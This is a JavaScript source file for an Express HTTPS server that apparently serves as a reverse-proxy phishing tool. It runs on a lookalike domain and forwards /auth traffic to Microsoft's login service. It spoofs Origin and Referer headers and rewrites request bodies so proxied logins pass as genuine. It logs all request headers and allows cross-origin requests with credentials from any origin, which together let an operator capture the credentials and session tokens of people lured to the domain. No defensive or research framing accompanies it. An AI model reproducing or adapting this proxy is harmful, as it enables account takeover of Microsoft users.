import express from 'express';
import { createProxyMiddleware } from 'http-proxy-middleware';
import https from 'https';
import fs from 'fs';

const app = express();
const PORT = 443; // Use 443 for HTTPS
const DOMAIN = 'airdropseth.com'; // Your domain name
const TARGET_URL = 'https://login.microsoftonline.com'; // Microsoft login URL

// Middleware to parse JSON bodies
app.use(express.json()); // For parsing application/json
app.use(express.urlencoded({ extended: true })); // For parsing application/x-www-form-urlencoded

// Function to replace occurrences of a string in an object
const replaceInObject = (obj, oldValue, newValue) => {
  for (const key in obj) {
    if (typeof obj[key] === 'string') {
      obj[key] = obj[key].replace(new RegExp(oldValue, 'g'), newValue);
    } else if (typeof obj[key] === 'object') {
      replaceInObject(obj[key], oldValue, newValue);
    }
  }
};

// Create the proxy middleware
const proxyMiddleware = createProxyMiddleware({
  target: TARGET_URL,
  changeOrigin: true, // Change the origin of the host header to the target URL
  secure: true, // Ensure the proxy uses HTTPS
  followRedirects: true, // Follow redirects from the target server
  onProxyReq: (proxyReq, req, res) => {
    // Log the original request headers for debugging
    console.log('Original Request Headers:', req.headers);

    // Replace 'airdrops.eth' in headers
    replaceInObject(req.headers, 'https://airdrops.eth', 'https://login.microsoftonline.com');

    // Set modified headers back to the proxy request
    for (const [key, value] of Object.entries(req.headers)) {
      proxyReq.setHeader(key, value);
    }

    // Modify the Origin header to the target URL
    proxyReq.setHeader('Origin', TARGET_URL); // Change the Origin header
    console.log('Modified Origin Header:', proxyReq.getHeader('Origin'));

    // Modify the Referer header to the target URL
    proxyReq.setHeader('Referer', TARGET_URL); // Change the Referer header
    console.log('Modified Referer Header:', proxyReq.getHeader('Referer'));

    // If the request method is POST, modify the body
    if (req.method === 'POST') {
      const body = JSON.stringify(req.body); // Get the original body
      const modifiedBody = body.replace(/airdrops\.eth/g, 'login.microsoftonline.com'); // Replace in body
      proxyReq.setHeader('Content-Length', Buffer.byteLength(modifiedBody)); // Update content length
      proxyReq.write(modifiedBody); // Write the modified body to the request
      proxyReq.end(); // End the request
    }
  },
  onProxyRes: (proxyRes, req, res) => {
    // Log the response headers from the target server
    console.log('Response Headers from Target Server:', proxyRes.headers);

    // Set CORS headers to allow requests from your frontend
    res.setHeader('Access-Control-Allow-Origin', '*'); // Allow all origins or set to specific origin
    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'X-Requested-With, content-type, authorization');
    res.setHeader('Access-Control-Allow-Credentials', 'true');
  },
});

// Handle preflight requests
app.options('*', (req, res) => {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'X-Requested-With, content-type, authorization');
  res.setHeader('Access-Control-Allow-Credentials', 'true');
  res.sendStatus(200);
});

// Use the proxy for authentication requests
app.use('/auth', proxyMiddleware); // Forward requests to /auth to the Microsoft login

// Create HTTPS server
const httpsOptions = {
  key: fs.readFileSync('crt.key'),  // Update this path
  cert: fs.readFileSync('crt.crt')  // Update this path
};

https.createServer(httpsOptions, app).listen(PORT, () => {
  console.log(`Server running on https://${DOMAIN}`);
});
